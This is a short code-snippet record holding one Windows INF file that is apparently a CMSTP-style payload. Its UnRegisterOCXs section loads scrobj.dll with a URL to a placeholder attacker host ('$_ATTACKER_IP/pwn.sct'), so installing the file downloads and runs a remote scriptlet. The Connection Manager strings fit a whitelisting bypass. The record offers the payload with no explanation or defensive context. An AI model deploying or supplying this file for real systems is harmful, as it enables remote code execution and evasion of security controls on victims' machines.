---
id: ffe7571a-e0f0-410b-bc5b-e4c694e2731b
type: code
language: INF File
verified: false
created_at: '2020-03-17T03:03:22.261553+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet ffe7571a

**Language**: INF File

```inf file
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall_SingleUser]
UnRegisterOCXs=UnRegisterOCXSection

[UnRegisterOCXSection]
%11%\scrobj.dll,NI,http://$_ATTACKER_IP/pwn.sct

[Strings]
AppAct="SOFTWARE\Microsoft\Connection Manager"
ServiceName="Corp"
ShortSvcName="Corp"
```


